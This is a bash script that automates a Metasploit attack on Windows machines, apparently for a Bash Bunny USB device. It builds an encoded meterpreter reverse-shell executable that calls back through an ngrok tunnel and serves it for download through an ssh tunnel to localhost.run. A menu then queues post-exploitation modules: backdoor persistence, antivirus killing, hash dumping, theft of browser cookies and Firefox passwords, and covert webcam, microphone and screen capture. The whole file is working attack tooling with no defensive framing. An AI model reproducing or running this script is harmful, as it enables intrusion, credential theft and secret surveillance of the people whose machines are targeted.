function execute()
{
    if [ -f "conf_files/autoruncommands.rc" ] || [ ! -f "conf_files/autoruncommands.rc" ]; then
        echo "[INFO] Cleaning autoruncommands.rc configuration file..."
        rm conf_files/autoruncommands.rc > /dev/null 2>&1
        touch conf_files/autoruncommands.rc
        echo "[INFO] Updating meterpreter.rc file..."
        rm conf_files/autoruncommands.rc > /dev/null 2>&1
        touch conf_files/autoruncommands.rc
        echo use exploit/multi/handler >> conf_files/meterpreter.rc
        echo set PAYLOAD windows/meterpreter/reverse_tcp >> conf_files/meterpreter.rc
        echo set LHOST 0.0.0.0 >> conf_files/meterpreter.rc
        echo set LPORT $port >> conf_files/meterpreter.rc
        echo set AutoRunScript multi_console_command -r conf_files/autoruncommands.rc >> conf_files/meterpreter.rc
        echo exploit >> conf_files/meterpreter.rc
        
        

        echo ""
        echo "PAYLOAD CENTER"
        echo ""

        choice="Select payloads to run at the start >> "
        options=(
        # Persistance
        "Install backdoor"
        "Migrate process"
        "Kill AV"
        "Enable RDP"
        "Install SSH"
        
        # Enumeration
        "Enumerate domain users"
        "Enumerate SSH Credentials"
        "Enumerate Software Version"
        "Scan for local vulnerabilities"
        "Dump system hashed passwords"
        "Get Chrome Cookies"
        "Get passwords stored in firefox"

        # Voyeur mode
        "Show screen of the user in real time"
        "Record microphone"
        "Enable Webcam"

        # Others
        "All"
        "Execute the launcher"
        "Exit"
        )

        select opt in "${options[@]}"
        do
            case $opt in
                "Install backdoor")
                    echo run exploit/windows/local/persistence -X -i 5 -p $port -r 0.0.0.0 >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 1 loaded successfully"
                    ;;
                "Migrate process")
                    echo run post/windows/manage/migrate >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 2 loaded successfully"
                    ;;
                "Kill AV")
                    echo run post/windows/manage/killav >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 3 loaded successfully"
                    ;;
                "Enable RDP")
                    echo run post/windows/manage/enable_rdp >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 4 loaded successfully"
                    ;;
                "Install SSH")
                    echo run post/windows/manage/install_ssh >> conf_files/autoruncommands.rc
                    echo run post/windows/manage/sshkey_persistence >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 5 loaded successfully"
                    ;;
                "Enumerate SSH Credentials")
                    echo run post/multi/gather/ssh_creds >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 6 loaded successfully"
                    ;;
                "Enable Webcam")
                    echo run post/windows/manage/webcam >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 7 loaded successfully"
                    ;;
                "Enumerate domain users")
                    echo run post/windows/gather/enum_ad_users >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 8 loaded successfully"
                    ;;
                "Scan for local vulnerabilities")
                    echo run post/multi/recon/local_exploit_suggester >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 9 loaded successfully"
                    ;;
                "Dump system hashed passwords")
                    echo run post/windows/gather/hashdump >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 10 loaded successfully"
                    ;;
                "Enumerate Software Version")
                    echo run post/multi/gather/enum_software_versions >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 11 loaded successfully"
                    ;;
                "Get Chrome Cookies")
                    echo run post/multi/gather/chrome_cookies >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 12 loaded successfully"
                    ;;
                "Get passwords stored in firefox")
                    echo run post/multi/gather/firefox_creds >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 13 loaded successfully"
                    ;;
                "Show screen of the user in real time")
                    echo run post/multi/manage/screenshare >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 14 loaded successfully"
                    ;;
                "Record microphone")
                    echo run post/multi/manage/record_mic >> conf_files/autoruncommands.rc
                    echo "[INFO] Payload 15 loaded successfully"
                    ;;
                "All")
                    echo run exploit/windows/local/persistence -X -i 5 -p $port -r 0.0.0.0 >> conf_files/autoruncommands.rc
                    echo run post/windows/manage/migrate >> conf_files/autoruncommands.rc
                    echo run post/windows/manage/killav >> conf_files/autoruncommands.rc
                    echo run post/windows/manage/enable_rdp >> conf_files/autoruncommands.rc
                    echo run post/windows/manage/install_ssh >> conf_files/autoruncommands.rc
                    echo run post/windows/manage/sshkey_persistence >> conf_files/autoruncommands.rc
                    echo run post/multi/gather/ssh_creds >> conf_files/autoruncommands.rc
                    echo run post/windows/manage/webcam >> conf_files/autoruncommands.rc
                    echo run post/windows/gather/enum_ad_users >> conf_files/autoruncommands.rc
                    echo run post/multi/recon/local_exploit_suggester >> conf_files/autoruncommands.rc
                    echo run post/windows/gather/hashdump >> conf_files/autoruncommands.rc
                    echo run post/multi/gather/enum_software_versions >> conf_files/autoruncommands.rc
                    echo run post/multi/gather/chrome_cookies >> conf_files/autoruncommands.rc
                    echo run post/multi/gather/firefox_creds >> conf_files/autoruncommands.rc
                    echo run post/multi/manage/screenshare >> conf_files/autoruncommands.rc
                    echo run post/multi/manage/record_mic >> conf_files/autoruncommands.rc
                    echo "[INFO] All payloads loaded successfully"
                    ;;
                "Execute the launcher")
                    msfconsole -r conf_files/meterpreter.rc -q
                    if [[ $? -eq 1 ]]; then
                        echo "[ERROR] Something went wrong executing the launcher"
                    fi
                    ;;
                "Exit")
                    echo "[INFO] Exiting"
                    exit
                    ;;
                *) echo "[ERROR] Invalid option $REPLY";;
            esac
        done
    else
        echo "[ERROR] Something went wrong running autoruncommands.rc"
    fi
}


tunnel=`cat logs/ngrok.log | grep "tcp://" | awk '{print $8}' | grep -Eo '[0-9].[a-z].[a-z].[a-z]*.[a-z]*.[a-z]*'`
tunnelport=`cat logs/ngrok.log | grep "tcp://" | awk '{print $8}' | grep -Eo '[tcp://].*' | awk -F: '{print $3}'`

# Creating payload
echo "[INFO] Listener mode activated"
echo "[INFO] Creating payload..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$tunnel LPORT=$tunnelport --platform windows -a x86 -e x86/shikata_ga_nai -f exe > bashbunny.exe 2>/dev/null > /dev/null

if [ $? -eq 0 ]; then
    echo "[INFO] Payload created successfully"
    if [ -f "conf_files/meterpreter.rc" ] || [ ! -f "conf_files/meterpreter.rc" ]; then
        echo "[INFO] Updating meterpreter.rc configuration file..."
        rm conf_files/meterpreter.rc > /dev/null 2>&1
        touch conf_files/meterpreter.rc
        echo use exploit/multi/handler >> conf_files/meterpreter.rc
        echo set PAYLOAD windows/meterpreter/reverse_tcp >> conf_files/meterpreter.rc
        echo set LHOST 0.0.0.0 >> conf_files/meterpreter.rc
        echo set LPORT $port >> conf_files/meterpreter.rc
        echo exploit >> conf_files/meterpreter.rc
        
        # Tunnelizing connections throught SSH
        if [ -f ~/.ssh/id_rsa ]; then
            echo "[WARNING] SSH Keys found"
            echo "[INFO] Using default SSH Keys"
            echo "[INFO] Tunnelizing connections"
            nohup ssh -R 80:localhost:80 localhost.run > logs/ssh.log 2>/dev/null &

            # Open localhost throught port 80 for download since target machine the file
            x-terminal-emulator -e "python3 -m http.server 80" &

            echo "[INFO] OK..."
            echo -e "[WARNING] Do you want to run commands in the start? [y/n] >> "
            read choice
            if [[ $choice == 'y' ]]; then
                echo "[INFO] OK..."
                execute
            else
                echo "[INFO] Executing the launcher"
                msfconsole -r conf_files/meterpreter.rc -q
            fi 
        else
            echo "[INFO] Generating SSH Keys"
            echo -ne "\n" | ssh-keygen
            if [ $? -eq 0 ]; then
                echo "[INFO] Keys created successfully"
                echo "[INFO] Tunnelizing connections"

                nohup ssh -R 80:localhost:80 localhost.run > logs/ssh.log 2>/dev/null &

                # Open localhost throught port 80 for download file
                x-terminal-emulator -e "python3 -m http.server 80" & > /dev/null

                echo "[INFO] OK..."
                echo -e "[WARNING] Do you want to run commands in the start? [y/n] >> "
                read start
                if [[ $start == 'y' ]]; then
                    echo "[INFO] OK..."
                    execute
                else
                    echo "[INFO] Executing the launcher"
                    msfconsole -r conf_files/meterpreter.rc -q
                fi                  
            else
                echo "[ERROR] Something went wrong generating the keys..."
            fi
        fi
    else
        echo "[ERROR] Something went wrong creating the file"
    fi
else
    echo "[ERROR] Something went wrong while creating the payload"
fi